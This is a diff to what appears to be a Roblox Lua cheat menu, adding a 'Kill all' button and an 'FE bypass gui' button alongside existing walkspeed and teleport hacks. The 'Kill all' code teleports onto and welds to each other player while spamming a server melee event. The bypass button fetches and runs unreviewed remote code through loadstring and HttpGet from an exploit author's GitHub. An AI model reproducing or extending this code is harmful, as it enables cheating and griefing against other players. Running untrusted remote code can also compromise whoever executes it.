@@ -25,6 +25,10 @@ local TextButton_7 = Instance.new("TextButton")
 local TextButton_8 = Instance.new("TextButton")
 local TextButton_9 = Instance.new("TextButton")
 local TextButton_10 = Instance.new("TextButton")
+local TextButton_11 = Instance.new("TextButton")
+local TextButton_12 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
 
 -- Properties
 
@@ -192,9 +196,50 @@ TextButton_10.TextScaled = true
 TextButton_10.TextSize = 14
 TextButton_10.TextWrapped = true
 
+TextButton_11.Parent = ScrollingFrame
+TextButton_11.BackgroundColor3 = Color3.new(0.0627451, 0.0627451, 0.0627451)
+TextButton_11.BorderColor3 = Color3.new(0, 0, 0)
+TextButton_11.BorderSizePixel = 0
+TextButton_11.Position = UDim2.new(0.30905512, 0, 0.364006549, 0)
+TextButton_11.Size = UDim2.new(0, 149, 0, 83)
+TextButton_11.Font = Enum.Font.SourceSans
+TextButton_11.Text = "Kill all"
+TextButton_11.TextColor3 = Color3.new(1, 1, 1)
+TextButton_11.TextScaled = true
+TextButton_11.TextSize = 14
+TextButton_11.TextWrapped = true
+
+TextButton_12.Parent = ScrollingFrame
+TextButton_12.BackgroundColor3 = Color3.new(0.0627451, 0.0627451, 0.0627451)
+TextButton_12.BorderColor3 = Color3.new(0, 0, 0)
+TextButton_12.BorderSizePixel = 0
+TextButton_12.Position = UDim2.new(0.620078743, 0, 0.363550067, 0)
+TextButton_12.Size = UDim2.new(0, 154, 0, 83)
+TextButton_12.Font = Enum.Font.SourceSans
+TextButton_12.Text = "FE bypass gui"
+TextButton_12.TextColor3 = Color3.new(1, 1, 1)
+TextButton_12.TextScaled = true
+TextButton_12.TextSize = 14
+TextButton_12.TextWrapped = true
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.new(0.0901961, 0.0901961, 0.0901961)
+TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.795275569, 0, 0.0874035954, 0)
+TextLabel_2.Size = UDim2.new(0, 27, 0, 15)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "V1"
+TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14
+TextLabel_2.TextWrapped = true
+
+UICorner_3.Parent = TextLabel_2
+
 -- Scripts
 
-local function PMDTH_fake_script() -- TextLabel.LocalScript 
+local function RRFBIM_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	local textLabel = script.Parent
@@ -214,8 +259,8 @@ local function PMDTH_fake_script() -- TextLabel.LocalScript
 		textLabel.TextColor3 = getRainbowColor(time)
 	end)
 end
-coroutine.wrap(PMDTH_fake_script)()
-local function PIIWYPB_fake_script() -- Frame.Dragify 
+coroutine.wrap(RRFBIM_fake_script)()
+local function XCBYXE_fake_script() -- Frame.Dragify 
 	local script = Instance.new('LocalScript', Frame)
 
 	local UIS = game:GetService("UserInputService")
@@ -256,8 +301,8 @@ local function PIIWYPB_fake_script() -- Frame.Dragify
 	dragify(script.Parent)
 	
 end
-coroutine.wrap(PIIWYPB_fake_script)()
-local function IKPIU_fake_script() -- TextButton.Script 
+coroutine.wrap(XCBYXE_fake_script)()
+local function EXCAHI_fake_script() -- TextButton.Script 
 	local script = Instance.new('Script', TextButton)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -282,24 +327,24 @@ local function IKPIU_fake_script() -- TextButton.Script
 		end		
 	end)
 end
-coroutine.wrap(IKPIU_fake_script)()
-local function BBDPOEI_fake_script() -- TextButton_2.Script 
+coroutine.wrap(EXCAHI_fake_script)()
+local function UKWFAYQ_fake_script() -- TextButton_2.Script 
 	local script = Instance.new('Script', TextButton_2)
 
 	script.Parent.MouseButton1Down:Connect(function()
 		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
 	end)
 end
-coroutine.wrap(BBDPOEI_fake_script)()
-local function DIEY_fake_script() -- TextButton_3.Script 
+coroutine.wrap(UKWFAYQ_fake_script)()
+local function TLYBB_fake_script() -- TextButton_3.Script 
 	local script = Instance.new('Script', TextButton_3)
 
 	script.Parent.MouseButton1Down:Connect(function()
 		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 	end)
 end
-coroutine.wrap(DIEY_fake_script)()
-local function AMAPL_fake_script() -- TextButton_4.Script 
+coroutine.wrap(TLYBB_fake_script)()
+local function VCIXEK_fake_script() -- TextButton_4.Script 
 	local script = Instance.new('Script', TextButton_4)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -311,8 +356,8 @@ local function AMAPL_fake_script() -- TextButton_4.Script
 		end)
 	end)
 end
-coroutine.wrap(AMAPL_fake_script)()
-local function GBYXE_fake_script() -- TextButton_5.Script 
+coroutine.wrap(VCIXEK_fake_script)()
+local function DKKEW_fake_script() -- TextButton_5.Script 
 	local script = Instance.new('Script', TextButton_5)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -323,8 +368,8 @@ local function GBYXE_fake_script() -- TextButton_5.Script
 		end
 	end)
 end
-coroutine.wrap(GBYXE_fake_script)()
-local function JPWOMIL_fake_script() -- TextButton_6.Script 
+coroutine.wrap(DKKEW_fake_script)()
+local function SDNH_fake_script() -- TextButton_6.Script 
 	local script = Instance.new('Script', TextButton_6)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -335,8 +380,8 @@ local function JPWOMIL_fake_script() -- TextButton_6.Script
 		end
 	end)
 end
-coroutine.wrap(JPWOMIL_fake_script)()
-local function RGRCM_fake_script() -- TextButton_7.Script 
+coroutine.wrap(SDNH_fake_script)()
+local function YRFTHKK_fake_script() -- TextButton_7.Script 
 	local script = Instance.new('Script', TextButton_7)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -346,8 +391,8 @@ local function RGRCM_fake_script() -- TextButton_7.Script
 		player.Character:MoveTo(targetPosition)
 	end)
 end
-coroutine.wrap(RGRCM_fake_script)()
-local function PHERS_fake_script() -- TextButton_8.Script 
+coroutine.wrap(YRFTHKK_fake_script)()
+local function CLUCM_fake_script() -- TextButton_8.Script 
 	local script = Instance.new('Script', TextButton_8)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -357,8 +402,8 @@ local function PHERS_fake_script() -- TextButton_8.Script
 		player.Character:MoveTo(targetPosition)
 	end)
 end
-coroutine.wrap(PHERS_fake_script)()
-local function RPCAGJO_fake_script() -- TextButton_9.Script 
+coroutine.wrap(CLUCM_fake_script)()
+local function FSKT_fake_script() -- TextButton_9.Script 
 	local script = Instance.new('Script', TextButton_9)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -368,8 +413,8 @@ local function RPCAGJO_fake_script() -- TextButton_9.Script
 		player.Character:MoveTo(targetPosition)
 	end)
 end
-coroutine.wrap(RPCAGJO_fake_script)()
-local function XWCC_fake_script() -- TextButton_10.Script 
+coroutine.wrap(FSKT_fake_script)()
+local function YIKWQMD_fake_script() -- TextButton_10.Script 
 	local script = Instance.new('Script', TextButton_10)
 
 	script.Parent.MouseButton1Down:Connect(function()
@@ -379,4 +424,91 @@ local function XWCC_fake_script() -- TextButton_10.Script
 		player.Character:MoveTo(targetPosition)
 	end)
 end
-coroutine.wrap(XWCC_fake_script)()
+coroutine.wrap(YIKWQMD_fake_script)()
+local function PINNIW_fake_script() -- TextButton_11.Script 
+	local script = Instance.new('Script', TextButton_11)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		local Players = game:GetService("Players")
+		local LocalPlayer = Players.LocalPlayer
+	
+		local function weldToPlayer(targetPlayer)
+			local localHumanoidRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+			local targetHumanoidRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+	
+			if localHumanoidRoot and targetHumanoidRoot then
+				local weld = Instance.new("WeldConstraint")
+				weld.Part0 = localHumanoidRoot
+				weld.Part1 = targetHumanoidRoot
+				weld.Parent = localHumanoidRoot
+				return weld
+			end
+		end
+	
+		local function fireMeleeEvent(targetPlayer, duration)
+			local startTime = tick()
+			while tick() - startTime < duration do
+				game.ReplicatedStorage.meleeEvent:FireServer(targetPlayer)
+				wait()
+			end
+		end
+	
+		local function teleportAndStickTo(player)
+			if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+				LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+				local weld = weldToPlayer(player)
+	
+				fireMeleeEvent(player, 1.5)
+	
+				if weld then
+					weld:Destroy()
+				end
+			end
+		end
+	
+		local function teleportToAll()
+			for _, player in pairs(Players:GetPlayers()) do
+				if player ~= LocalPlayer then
+					teleportAndStickTo(player)
+				end
+			end
+		end
+	
+		teleportToAll()
+	
+		local hint = Instance.new("Hint", workspace)
+		hint.Text = "Successfully killed all."
+		wait(5)
+		hint:Destroy()
+	end)
+end
+coroutine.wrap(PINNIW_fake_script)()
+local function HDXVIO_fake_script() -- TextButton_12.Script 
+	local script = Instance.new('Script', TextButton_12)
+
+	script.Parent.MouseButton1Down:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/Fe%20bypass", true))()
+	end)
+end
+coroutine.wrap(HDXVIO_fake_script)()
+local function JRYC_fake_script() -- TextLabel_2.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel_2)
+
+	local textLabel = script.Parent
+	
+	local function getRainbowColor(t)
+		local r = math.sin(t * 2 * math.pi + 0) * 0.5 + 0.5
+		local g = math.sin(t * 2 * math.pi + 2 * math.pi / 3) * 0.5 + 0.5
+		local b = math.sin(t * 2 * math.pi + 4 * math.pi / 3) * 0.5 + 0.5
+		return Color3.new(r, g, b)
+	end
+	
+	local speed = 1
+	local runService = game:GetService("RunService")
+	
+	runService.RenderStepped:Connect(function(deltaTime)
+		local time = tick() * speed % 1
+		textLabel.TextColor3 = getRainbowColor(time)
+	end)
+end
+coroutine.wrap(JRYC_fake_script)()
